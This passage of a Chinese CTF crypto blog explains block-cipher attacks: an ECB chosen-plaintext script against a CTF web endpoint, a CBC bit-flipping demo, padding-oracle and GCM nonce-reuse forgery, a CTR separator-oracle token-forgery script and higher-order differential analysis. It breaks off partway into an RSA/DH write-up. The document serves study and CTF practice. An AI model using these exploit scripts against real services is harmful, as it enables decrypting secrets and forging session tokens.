class="line"><span class="meta">@Value</span>(<span class="string">"$&#123;system.encrypt_key&#125;"</span>)</span><br><span class="line"><span class="keyword">private</span> String signKey;</span><br><span class="line"><span class="meta">@Value</span>(<span class="string">"$&#123;system.flag&#125;"</span>)</span><br><span class="line"><span class="keyword">private</span> String sign;</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">private</span> String <span class="title">desEncrypt</span><span class="params">(String plainText)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  String cipher = <span class="string">""</span>;</span><br><span class="line">  <span class="keyword">byte</span>[] originPlainText = (plainText + System.currentTimeMillis() + <span class="keyword">this</span>.sign).getBytes();</span><br><span class="line">  <span class="keyword">try</span></span><br><span class="line">  &#123;</span><br><span class="line">    TripleDesCipher tripleDesCipher = <span class="keyword">new</span> TripleDesCipher(<span class="keyword">this</span>.signKey.getBytes());</span><br><span class="line">    cipher = Base64.getEncoder().encodeToString(tripleDesCipher.encode(originPlainText));</span><br><span class="line">  &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>其3DES有选择明文攻击，且plainText可控，返回的密文为$E_{k}(plainText+System.currentTimeMillis()+flag)$</p><p>currentTimeMillis返回长度固定（除非运气极差碰上最高位进位…想peach）</p><p>且有<code>private static String TRIPLE_DES_TRANSFORMATION = &quot;DESede/ECB/PKCS5Padding&quot;</code>，因此有如下攻击方法：</p><p><img src= "/img/loading.gif" data-src="/2020/04/11/Summary-of-Crypto-in-CTF-Block/Snipaste_2020-08-12_16-28-03.png" alt></p><p>prefix填充<code>padding_length*&#39;a&#39;</code>后，恰好能使PKCS5后最后为<code>8*&#39;\x00&#39;</code></p><p>基于$8\mid(len(E_{k}(‘’+currentTimeMillis+flag))+padding_length)$</p><p>得到crack_area分组对应密文后，由于crack_area明文段后7bits均已知，因此send data为爆破位+7已知bits，当返回的ct[:8]与前者吻合时，爆破当前比特位成功</p><p>后续比特位均类似，prefix++得到新的crack_area内容，进而逐位爆破即可</p><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url1 = <span class="string">"http://dcf1d021-491b-4279-ae42-d56a10fc3334.node3.buuoj.cn/api//comment/news/28"</span></span><br><span class="line">url2 = <span class="string">"http://dcf1d021-491b-4279-ae42-d56a10fc3334.node3.buuoj.cn/api//comment/news/28?size=10&amp;page=0&amp;sort=commentId%2Cdesc"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">web_encrypt</span><span class="params">(payload)</span>:</span></span><br><span class="line">    r = requests.post(url1, json=&#123;<span class="string">"commentEmail"</span>: <span class="string">"1@qq.com"</span>,</span><br><span class="line">                                  <span class="string">"commentContent"</span>: payload, <span class="string">"commentNickname"</span>: <span class="string">"0xDktb"</span>&#125;)</span><br><span class="line">    commentId = r.json()[<span class="string">'commentId'</span>]</span><br><span class="line">    r = requests.get(url2)</span><br><span class="line">    content = r.json()[<span class="string">'content'</span>]</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> content:</span><br><span class="line">        <span class="keyword">if</span> _[<span class="string">'commentId'</span>] == commentId:</span><br><span class="line">            <span class="keyword">return</span> b64decode(_[<span class="string">'commentContent'</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_padding_length</span><span class="params">()</span>:</span></span><br><span class="line">    origin_length = len(web_encrypt(<span class="string">''</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">9</span>):</span><br><span class="line">        cur_length = len(web_encrypt(<span class="string">'a'</span> * i))</span><br><span class="line">        <span class="keyword">if</span> cur_length != origin_length:</span><br><span class="line">            <span class="keyword">return</span> (i, cur_length)  <span class="comment"># 8 | (len(enc(salt)) + i)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_salt</span><span class="params">(padding_length, crack_pos)</span>:</span></span><br><span class="line">    salt = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">42</span>):</span><br><span class="line">        crack_area = web_encrypt(</span><br><span class="line">            <span class="string">'a'</span> * (len(salt) + padding_length + <span class="number">1</span>))[crack_pos<span class="number">-8</span>:crack_pos]</span><br><span class="line">        <span class="keyword">if</span> len(salt) &gt;= <span class="number">7</span>:</span><br><span class="line">            payload = salt[:<span class="number">7</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            payload = salt + (<span class="number">7</span> - len(salt)) * chr(<span class="number">7</span> - len(salt))</span><br><span class="line">        isFound = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> string.printable:</span><br><span class="line">            guess = web_encrypt(c + payload)[:<span class="number">8</span>]</span><br><span class="line">            <span class="keyword">if</span> guess == crack_area:</span><br><span class="line">                isFound = <span class="literal">True</span></span><br><span class="line">                salt = c + salt</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">assert</span>(isFound == <span class="literal">True</span>)</span><br><span class="line">        print(salt)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    padding_length, crack_pos = crack_padding_length()</span><br><span class="line">    crack_salt(padding_length, crack_pos)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="Group-Mode-CBC"><a href="#Group-Mode-CBC" class="headerlink" title="Group Mode(CBC)"></a>Group Mode(CBC)</h3><h4 id="Theorem-4"><a href="#Theorem-4" class="headerlink" title="Theorem"></a>Theorem</h4><p><img src= "/img/loading.gif" data-src="/2020/04/11/Summary-of-Crypto-in-CTF-Block/cbc_encryption.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/04/11/Summary-of-Crypto-in-CTF-Block/cbc_decryption.png" alt></p><h5 id="CBC-Flipped-Ciphertext-Bits"><a href="#CBC-Flipped-Ciphertext-Bits" class="headerlink" title="CBC - Flipped Ciphertext Bits"></a>CBC - Flipped Ciphertext Bits</h5><p>可以看到CBC模式下，任一分组$C_{i}$的解密结果，均只与$C_{i}$和$C_{i-1}$有关（$C_{1}$只和$IV,C_{1}$有关）</p><p>因此只需令$C_{i-1}=C_{i-1}\oplus P_{i}\oplus (you\ want)$即可（从最后一块向前翻转）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: <span class="keyword">import</span> os</span><br><span class="line">   ...: <span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">   ...: key, iv = os.urandom(<span class="number">16</span>), os.urandom(<span class="number">16</span>)</span><br><span class="line">   ...: aes1 = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">   ...: aes2 = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: pt = <span class="string">b"0xDktb_wants_a_girlfriend_orzzzzzzzzzzzzzzzzzzzzzzzzzzzz"</span></span><br><span class="line">   ...: pad = <span class="keyword">lambda</span> x : (x + (<span class="number">16</span> - len(x) % <span class="number">16</span>) * bytes([<span class="number">16</span> - len(x) % <span class="number">16</span>]))</span><br><span class="line">   ...: pt = pad(pt)</span><br><span class="line">   ...: len(pt)</span><br><span class="line">Out[<span class="number">2</span>]: <span class="number">64</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: <span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a, b)</span>:</span></span><br><span class="line">   ...:     <span class="keyword">return</span> bytes(x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> zip(a, b))</span><br><span class="line">   ...: ct = aes1.encrypt(pt)</span><br><span class="line">   ...: payload = <span class="string">b"pt_1st_1s_H3r3!!pt_2nd_1s_H3r3!!pt_3rd_1s_H3r3!!pt_4th_1s_H3r3!!"</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">4</span>]: <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">   ...:     ct_block = xor(xor(pt[<span class="number">16</span>*(<span class="number">3</span>-i):<span class="number">16</span>*(<span class="number">4</span>-i)], ct[<span class="number">16</span>*(<span class="number">2</span>-i):<span class="number">16</span>*(<span class="number">3</span>-i)]), payload[<span class="number">16</span>*(<span class="number">3</span>-i):<span class="number">16</span>*(<span class="number">4</span>-i)])</span><br><span class="line">   ...:     ct = ct[:<span class="number">16</span>*(<span class="number">2</span>-i)] + ct_block + ct[<span class="number">16</span>*(<span class="number">3</span>-i):]</span><br><span class="line">   ...:     dec_iv = ct[<span class="number">-16</span>:]</span><br><span class="line">   ...:     pt = aes2.decrypt(ct)</span><br><span class="line">   ...: dec_iv = xor(xor(pt[:<span class="number">16</span>], dec_iv), payload[:<span class="number">16</span>])</span><br><span class="line">   ...: aes3 = AES.new(key, AES.MODE_CBC, dec_iv)</span><br><span class="line">   ...: pt = aes3.decrypt(ct)</span><br><span class="line">   ...: print(pt)</span><br><span class="line"><span class="string">b'pt_1st_1s_H3r3!!pt_2nd_1s_H3r3!!pt_3rd_1s_H3r3!!pt_4th_1s_H3r3!!'</span></span><br></pre></td></tr></table></figure><h5 id="CBC-Chosen-Plaintext-Attack"><a href="#CBC-Chosen-Plaintext-Attack" class="headerlink" title="CBC - Chosen Plaintext Attack"></a>CBC - Chosen Plaintext Attack</h5><p><a href="https://0xdktb.top/2020/08/02/WriteUp-WMCTF2020-Crypto/#Game" target="_blank" rel="noopener">https://0xdktb.top/2020/08/02/WriteUp-WMCTF2020-Crypto/#Game</a></p><h5 id="CBC-Padding-Oracle-Attack"><a href="#CBC-Padding-Oracle-Attack" class="headerlink" title="CBC - Padding Oracle Attack"></a>CBC - Padding Oracle Attack</h5><p>在服务器检查解密合法性，为检查PKCS5-padding的suffix部分，且合法与非法返回不同状态时（不返回明文内容），可以采用Padding Oracle Attack</p><p><img src= "/img/loading.gif" data-src="/2020/04/11/Summary-of-Crypto-in-CTF-Block/Snipaste_2020-08-13_10-14-57.png" alt></p><h3 id="Group-Mode-GCM"><a href="#Group-Mode-GCM" class="headerlink" title="Group Mode(GCM)"></a>Group Mode(GCM)</h3><h4 id="Theorem0"><a href="#Theorem0" class="headerlink" title="Theorem0"></a>Theorem0</h4><p><img src= "/img/loading.gif" data-src="/2020/04/11/Summary-of-Crypto-in-CTF-Block/Snipaste_2020-08-13_16-26-27.png" alt></p><p>对AES-GCM，有以下<strong>符号定义</strong>：</p><p>$a|b$: a, b位串的连接；</p><p>$0^{s}$: 长度为s的0串</p><p>$A_{i}$: 第i块的auth-data</p><p>$IV$: 96bits(12bytes)初始向量</p><p>$cnt$: 4bytes计数器counter值，$cnt=(i+1)\%2^{32}$</p><p>$J_{i}$: 第i块的Enc input，$J_{0}=IV||0^{31}||1$</p><p>$Gmul_{H}(X)$: $GF(2^{128})$上的$H\cdot X$，素多项式$f=1+\alpha+\alpha^{2}+\alpha^{7}+\alpha^{128}$</p><p>对生成auth-tag的过程有：</p><ul><li>$H=Enc_{k}(0^{128})$</li><li>$X_{0}=0$，假设Auth-data占了m个block长度，$X_{i}=Gmul_{H}(X_{i-1}\oplus A_{i})$,for $i\in\{1,..,m\}$</li><li>$X_{i+m}=Gmul_{H}(X_{i+m-1}\oplus C_{i})$,for $i\in\{1,…,n\}$</li><li>$S=Gmul_{H}(X_{m+n}\oplus(len(A)||len(C)))$，len(A)和len(C)均为长度64的位串（BLOCK_SIZE/2)</li><li>$T=S\oplus Enc_{k}(J_{0})$，即为auth-tag</li></ul><p>GCM最后返回的消息为$C||T$.</p><h4 id="Theorem1-The-Forbidden-Attack"><a href="#Theorem1-The-Forbidden-Attack" class="headerlink" title="Theorem1 - The Forbidden Attack"></a>Theorem1 - The Forbidden Attack</h4><h5 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h5><p>TLS下的AES-GCM生成的12bytes IV由以下部分组成：</p><ul><li>Salt(4 bytes)：由TLS handshake，值等于server_write_IV / client_write_IV，属于IV的implicit part</li><li>Nonce(8 bytes)：服务器随机生成，属于IV的explicit part</li></ul><p>$g(X)=A_{1}X^{m+n+1}+…+A_{m}X^{n+2}+C_{1}X^{n+1}+…+C_{n}X^{2}+LX+Enc_{k}(J_{0})$</p><p>(其中$L=(len(A)||len(C))$)</p><p>$g(H)=T$</p><p>我们的攻击主要基于已找到Nonce相同的一对collision（同一会话下Salt不变），则有</p><p>假设$m=0,n=1$，</p><p>$g_{1}(X)=C_{1,1}X^{2}+L_{1}X+Enc_{k}(J_{0})$</p><p>$g_{2}(X)=C_{2,1}X^{2}+L_{2}X+Enc_{k}(J_{0})$</p><p>且$g_{1}(H)=T_{1},g_{2}(H)=T_{2}$</p><p>$\therefore(C_{1,1}+C_{2,1})H^{2}+(L_{1}+L_{2})H+T_{1}+T_{2}=0$. (系数均已知)</p><p>故candidate H在上述方程的roots中，而roots总数一般与方程degree相同，且现实中degree并不会过大（消息极长除外），因此在发生nonce collision时，H的值就能被攻击</p><p><img src= "/img/loading.gif" data-src="/2020/04/11/Summary-of-Crypto-in-CTF-Block/Snipaste_2020-08-16_23-39-32.png" alt></p><p>有了H就意味着我们能自生成合法auth-tag</p><p>攻击场景实例：</p><blockquote><p>服务器与客户端间以AES/GCM进行通信，<strong>AES密钥及4bytes的Salt</strong>双方在通过密钥协商协议后各自保存在本地（第三方无法获取）</p><p>在正常通信时，传输的为<strong>cipher &amp; auth-tag T &amp; Nonce(8 bytes)</strong>，可被第三方截取</p><p>则若我们通过上述方法攻破H，又有<strong>已知明文攻击的Oracle</strong>，即可通过已知明文的一组数据进行密文篡改并自生成合法auth-tag，实现对服务器的欺骗</p></blockquote><h3 id="Group-Mode-CTR"><a href="#Group-Mode-CTR" class="headerlink" title="Group Mode(CTR)"></a>Group Mode(CTR)</h3><h4 id="Theorem0-1"><a href="#Theorem0-1" class="headerlink" title="Theorem0"></a>Theorem0</h4><p><img src= "/img/loading.gif" data-src="/2020/04/11/Summary-of-Crypto-in-CTF-Block/1920px-CTR_encryption_2.svg.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/04/11/Summary-of-Crypto-in-CTF-Block/1920px-CTR_decryption_2.svg.png" alt></p><p>$C_j=E_k(nonce_j)\oplus P_j$</p><p>$P_j=E_k(nonce_j)\oplus C_{j}$</p><h4 id="Theorem1-Separator-Oracle"><a href="#Theorem1-Separator-Oracle" class="headerlink" title="Theorem1 -  Separator Oracle"></a>Theorem1 -  Separator Oracle</h4><p>假设明文格式为$username||timestamp||userlevel$</p><p>Separator Oracle能应用的场景大致为：</p><p>普通用户注册后，服务器给出其$username||timestamp||userlevel$通过CTR加密生成的token，保持作sessionid</p><p>在发起登陆请求时，服务端解密sessionid后若不成功会根据具体情况返回不用Exception</p><p>我们主要利用的为separate错误引起的Error抛出：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">separator = <span class="string">'|'</span></span><br><span class="line">ct = get_cookie(<span class="string">'sessionid'</span>)</span><br><span class="line">pt = decrypt(ct)</span><br><span class="line">pt = pt.split(separator)</span><br><span class="line"><span class="keyword">if</span> len(pt) != <span class="number">3</span>:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">"Separate failed."</span>)</span><br></pre></td></tr></table></figure><p>攻击思路如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pt = [<span class="number">0</span>] * len(ct)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(ct)):</span><br><span class="line">    new_ct1 = ct[:i] + bytes([ct[i] ^ <span class="number">1</span>]) + ct[i+<span class="number">1</span>:]</span><br><span class="line">    new_ct2 = ct[:i] + bytes([ct[i] ^ <span class="number">2</span>]) + ct[i+<span class="number">1</span>:]</span><br><span class="line">    resp1, resp2 = oracle(new_ct1), oracle(new_ct2)</span><br><span class="line">    <span class="keyword">if</span> resp1 == SeparatorException <span class="keyword">and</span> resp2 == SeparatorException:</span><br><span class="line">        pt[i] = ord(<span class="string">'|'</span>) <span class="comment"># i is a separator's index</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">0x100</span>):</span><br><span class="line">            new_ct = ct[:i] + bytes([ct[i] ^ j]) + ct[i+<span class="number">1</span>:]</span><br><span class="line">            resp = oracle(new_ct)</span><br><span class="line">            <span class="keyword">if</span> resp == SeparatorException: <span class="comment"># add a separator(too much)</span></span><br><span class="line">                pt[i] = j ^ ord(<span class="string">'|'</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">pt = bytes(pt)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> bytes(x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> zip(a, b))</span><br><span class="line"></span><br><span class="line">key = xor(pt, ct)</span><br></pre></td></tr></table></figure><p>原理很简单，CTR实质上可视作流密码（因为在需要加解密时，其分组密码部分得到的key是固定的）</p><p>对于ct的任一byte，若其对应pt的byte为一separator，则在异或上任一非零值送去解密时，oracle均会返回SeparatorException（occurred by removing a separator）</p><p>而若对应的非separator，则只需爆破异或的值，当返回SeparatorException时，即可知$new_ct\oplus j=ct\oplus ord(‘|’)$</p><p>通过这种攻击方式，我们能还原出分组加密部分的Key，且由于CTR mode是没有鉴别码机制的</p><p>因此我们能得到任意P’对应的密文$C’=C\oplus P\oplus P’$，即合法token，进行admin伪造（若中间为时间戳的话需篡改为满足token现仍有效期内的值）</p><h3 id="高阶差分分析"><a href="#高阶差分分析" class="headerlink" title="高阶差分分析"></a>高阶差分分析</h3><h4 id="Theorem0-离散高阶函数与高阶差分"><a href="#Theorem0-离散高阶函数与高阶差分" class="headerlink" title="Theorem0 - 离散高阶函数与高阶差分"></a>Theorem0 - 离散高阶函数与高阶差分</h4><p><strong>定义1.</strong> 设$(S,+)$和$(T,+)$是两个Abel群，$f:S\rightarrow T$，则f在S中a点处的导数定义为</p><script type="math/tex; mode=display">\Delta_{a}f(x)=f(x+a)-f(x)</script><p>在点$\{a_1,a_2,…,a_i\}$处的i阶导数定义为</p><script type="math/tex; mode=display">\Delta_{a_1,a_2,...,a_i}^{(i)}f(x)=\Delta_{a_i}(\Delta_{a_1,a_2,...,a_i}^{(i-1)}f(x))</script><p><strong>命题1.</strong> 设f是一个n变元的布尔函数，函数的代数次数为deg(f)，则</p><script type="math/tex; mode=display">deg(\Delta_af(x))\leq deg(f(x))-1</script><p>(布尔函数f是从$F_2^n$到$F_2$的映射)</p><p><strong>命题2.</strong> 设f是一个n变元的布尔函数，则函数的n阶导数为常数(constant)，进一步，若f可逆，则其n-1阶导数为常数</p><p><strong>命题3.</strong> 设f是一个n变元的布尔函数，$L[a_1,…,a_i]$是$a_1,…,a_i$的所有可能的线性组合，则</p><script type="math/tex; mode=display">\Delta_{a_1,...,a_i}^{(i)}f(x)=\sum_{c\in L[a_1,...,a_i]}f(x\oplus c)</script><p><strong>命题4.</strong> 布尔函数的高阶导数只依赖于其阶的大小，即</p><script type="math/tex; mode=display">\Delta_{a_1,...,a_i}^{(i)}f(x)=\Delta_{a_{\pi(1)},...,a_{\pi(i)}}^{(i)}f(x)</script><p><strong>命题5.</strong> 设$f:F_2^n\rightarrow F_2^n$，$a_1,a_2,…,a_i$是$F_2^n$上i个线性无关的向量，若x在$F_2^n$上分布均匀，则对任意$b\in F_2^n$，等式$\Delta_{a_1,…,a_i}^{(i)}f(x)=b$成立的概率要么为0，要么至少为$2^{i-n}$</p><p>Proof: 假设有$\Delta_{a_1,…,a_i}^{(i)}f(x_0)=b$，则$\sum_{c\in L[a_1,…,a_i]}f(x\oplus c)=b$，进而</p><p>$\forall c\in L[a_1,…,a_i],\Delta_{a_1,…,a_i}^{(i)}f(x_0\oplus c)=b$，$Pro(\Delta_{a_1,…,a_i}^{(i)}f(x)=b)\geq2^{i}/2^{n}=2^{i-n}$</p><p>Q.E.D.</p><p><strong>命题6.</strong> 当输入x均匀时，则差分对(a, b)出现的概率为f(x)在点a处的一阶导数取值b的概率</p><p>$P(\Delta_y=b|\Delta_x=a)=P(f(x+a)-f(x)=b)=P(\Delta_af(x)=b)$</p><p>进而推广至高阶差分，函数的一条i阶差分，即找到一i+1元数组$(a_1,…,a_i,b)$，使得$\Delta_{a_1,…,a_i}^{(i)}f(x)=b$</p><p><strong>离散高阶函数与高阶差分的联系为：</strong> f(x)有一条i阶差分$(a_1,…,a_i,b)$当且仅当f(x)在$(a_1,…,a_i)$处导数为b</p><h4 id="Theorem1-高阶差分攻击"><a href="#Theorem1-高阶差分攻击" class="headerlink" title="Theorem1 -  高阶差分攻击"></a>Theorem1 -  高阶差分攻击</h4><p>以下为对一般分组密码的高阶差分攻击的框架：</p><p>设E是一个r rounds的分组密码算法，可写作$Y=E(X,K)$，假设</p><p>r-1 rounds的加密算法$E_{r-1}(X,K_{1},…,K_{r-1})$的deg为d，则</p><script type="math/tex; mode=display">\Delta_{a_1,...,a_d}^{(d)}E_{r-1}(X,K_{1},...,K_{r-1})=0</script><p>(由于$E_{r-1}$可逆)，且有</p><script type="math/tex; mode=display">E_{r}^{-1}(Y,K_{r})=E_{r-1}(X,K_{1},...,K_{r-1})\\\Delta_{a_1,...,a_d}^{(d)}E_{r}^{-1}(Y,K_{r})=0\\\therefore\sum_{c\in L(...)}E_{r}^{-1}(Y\oplus c,K_{r})=0</script><p>则当d-1足够小时，攻击者就可以通过下述攻击流程获得最后一轮的轮密钥$K_{r}$：</p><ol><li>寻找一个r-1 rounds的高阶差分区分器；</li><li>根据<strong>差分区分器</strong>的输出特征，确定要恢复的最后一轮轮密钥长度（一般不直接一次性恢复完整长度的轮密钥），不妨设所要恢复的部分轮密钥长度为s，则设置$2^{s}$个密钥计数器，初始化均为0；</li><li>随机选取一个d维子空间L（要求E可逆），则对所有$X\in L$，利用同一未知的密钥对其进行加密，获得对应的密文Y（Chosen Plain Attack，Oracle）；</li><li>利用所有最后一轮的候选密钥对Y进行解密并<strong>求和</strong>，若该值为0，则对应counter++；</li><li>选取counter max对应的作为正确$K_{r}$；</li></ol>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Block </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WriteUp(Aurora) - Mission Impossible</title>
      <link href="/2020/04/05/WriteUp-Aurora-Mission-Impossible/"/>
      <url>/2020/04/05/WriteUp-Aurora-Mission-Impossible/</url>
      
        <content type="html"><![CDATA[<h4 id="题目考点"><a href="#题目考点" class="headerlink" title="[题目考点]"></a>[题目考点]</h4><ul><li>DH-MIMT</li><li>RSA私钥低位泄露引起的CopperSmith攻击 (预期解是解同余方程)</li></ul><h4 id="题目文件"><a href="#题目文件" class="headerlink" title="[题目文件]"></a>[题目文件]</h4><p><a href="Impossible Mission.zip">Click Here to Download</a></p><h4 id="题解分析"><a href="#题解分析" class="headerlink" title="[题解分析]"></a>[题解分析]</h4><p><strong>Encryption</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Step 1</span></span><br><span class="line">aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">flag = adaptmessage(flag) <span class="comment"># right padding with b'\x00'</span></span><br><span class="line">encrypted_flag = b64encode(aes.encrypt(flag))</span><br><span class="line"><span class="comment"># Step 2</span></span><br><span class="line">p = getPrime(<span class="number">700</span>)</span><br><span class="line">q = getPrime(<span class="number">1400</span>)</span><br><span class="line">e = getPrime(<span class="number">10</span>)</span><br><span class="line"><span class="keyword">assert</span>(GCD(e, phi) == <span class="number">1</span>)</span><br><span class="line">enc = pow(bytes_to_long(key), e, n)</span><br><span class="line">print(<span class="string">"Brooke's partial d: "</span> + str(d % (<span class="number">2</span>**<span class="number">1050</span>))) <span class="comment"># leak d's low 1050bits</span></span><br><span class="line"><span class="comment"># Step 3</span></span><br><span class="line"><span class="comment"># DH-MIMT challenging(5 round's success required)</span></span><br><span class="line"><span class="comment"># Finally given message including enc in Step2</span></span><br></pre></td></tr></table></figure><p><strong>Decryption</strong></p><p>DH-MIMT后，获得AES密钥的对应RSA密文.</p><ul><li>Crack p (700 bits)</li></ul><p>$\because ed_{0}p\equiv p+kpn-kp^{2}-kn+kp(mod\ 2^{size(d_{0})}),k\in [1,e]$</p><p>$\because size(p)&lt;size(d_{0})$</p><p>$\therefore$ 求解p的一元模等式即可（至多e次）</p><ul><li>Crack q (1400 bits)</li></ul><p>$\because size(n)=2100,size(d0)=1050&gt;\frac{size(n)}{4}$</p><p>由Crack p里提到的模等式可求解出q的低1050 bits，因此问题转化为partial_p</p><p>$\beta$取0.65略小于$\frac{size(q)}{size(n)}$，根上界取$2^{1400-size(q_{0})}$.</p><ul><li>在Crack p时每一轮start一个守护线程，来进行Crack q</li></ul><h4 id="exp"><a href="#exp" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span 